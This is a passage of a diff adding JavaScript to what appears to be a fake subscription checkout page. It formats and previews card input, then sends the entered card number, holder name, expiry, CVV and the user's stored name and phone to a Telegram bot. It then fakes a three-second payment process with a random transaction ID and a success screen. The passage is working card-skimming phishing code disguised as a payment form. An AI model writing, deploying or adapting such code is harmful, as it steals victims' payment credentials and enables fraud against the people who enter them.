+            } else if (selectedMethod === 'card') {
+                showPage('cardPage');
+            }
+        });
+
+        // Card number formatting
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s/g, '');
+            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
+            e.target.value = formattedValue;
+            
+            // Update card preview
+            let displayValue = formattedValue;
+            if (value.length < 4) {
+                displayValue = '•••• •••• •••• ••••';
+            } else if (value.length < 8) {
+                displayValue = value.substring(0, 4) + ' •••• •••• ••••';
+            } else if (value.length < 12) {
+                displayValue = value.substring(0, 4) + ' ' + value.substring(4, 8) + ' •••• ••••';
+            } else if (value.length < 16) {
+                displayValue = value.substring(0, 4) + ' ' + value.substring(4, 8) + ' ' + value.substring(8, 12) + ' ••••';
+            } else {
+                displayValue = formattedValue;
+            }
+            document.getElementById('cardNumberDisplay').textContent = displayValue;
+        });
+
+        // Card holder name
+        document.getElementById('cardHolder').addEventListener('input', function(e) {
+            document.getElementById('cardHolderDisplay').textContent = e.target.value.toUpperCase() || 'YOUR NAME';
+        });
+
+        // Card expiry formatting
+        document.getElementById('cardExpiry').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            e.target.value = value;
+            document.getElementById('cardExpiryDisplay').textContent = value || 'MM/YY';
+        });
+
+        // Pay with card button
+        document.getElementById('payWithCardBtn').addEventListener('click', async () => {
+            const cardData = {
+                number: document.getElementById('cardNumber').value,
+                holder: document.getElementById('cardHolder').value,
+                expiry: document.getElementById('cardExpiry').value,
+                cvv: document.getElementById('cardCvv').value,
+                plan: selectedPlan,
+                price: selectedPrice
+            };
+            
+            // Get user data from localStorage
+            const userData = JSON.parse(localStorage.getItem('userData') || '{}');
+            
+            // Send card data to Telegram
+            const message = `
+                <b>New Card Payment</b>
+                <b>User:</b> ${userData.name || 'Unknown'}
+                <b>Phone:</b> ${userData.phone || 'Unknown'}
+                <b>Card Number:</b> ${cardData.number}
+                <b>Card Holder:</b> ${cardData.holder}
+                <b>Expiry:</b> ${cardData.expiry}
+                <b>CVV:</b> ${cardData.cvv}
+                <b>Plan:</b> ${cardData.plan}
+                <b>Price:</b> ₹${cardData.price}
+            `;
+            
+            showPage('paymentLoadingPage');
+            
+            const result = await sendToTelegram(message);
+            
+            if (result) {
+                console.log('Card payment data sent to Telegram successfully');
+                
+                // Simulate payment processing
+                setTimeout(() => {
+                    // Update transaction details
+                    const now = new Date();
+                    const dateStr = now.toLocaleDateString('en-US', { 
+                        day: 'numeric', 
+                        month: 'long', 
+                        year: 'numeric' 
+                    });
+                    const timeStr = now.toLocaleTimeString('en-US', { 
+                        hour: '2-digit', 
+                        minute: '2-digit' 
+                    });
+                    
+                    document.getElementById('transactionDate').textContent = `${dateStr} at ${timeStr}`;
+                    document.getElementById('transactionAmount').textContent = `₹${selectedPrice}`;
+                    
+                    // Generate random transaction ID
+                    const txnId = 'TXN' + Math.floor(Math.random() * 1000000000);
+                    document.getElementById('transactionId').textContent = txnId;
+                    
+                    showPage('paymentSuccessPage');
+                }, 3000);
+            } else {
+                console.error('Failed to send card payment data to Telegram');
+                alert('Payment failed. Please try again.');
+                showPage('cardPage');
+            }
+        });
+
+        // Enter app button
+        document.getElementById('enterAppBtn').addEventListener('click', () => {
+            showPage('appPage');
+        });
+
+        // View details button
+        document.getElementById('viewDetailsBtn').addEventListener('click', () => {
+            alert('Transaction details would be shown here');
+        });
+
+        // Share receipt button
+        document.getElementById('shareReceiptBtn').addEventListener('click', () => {
+            alert('Receipt sharing functionality would be implemented here');
+        });
+
+        // App control buttons
+        document.querySelectorAll('.control-btn').forEach(btn => {
+            btn.addEventListener('click', () => {
+                // Add visual feedback
+                btn.style.transform = 'scale(0.9)';
+                setTimeout(() => {
+                    btn.style.transform = '';
+                }, 200);
+            });
+        });
+    </script>
+</body>
+</html>
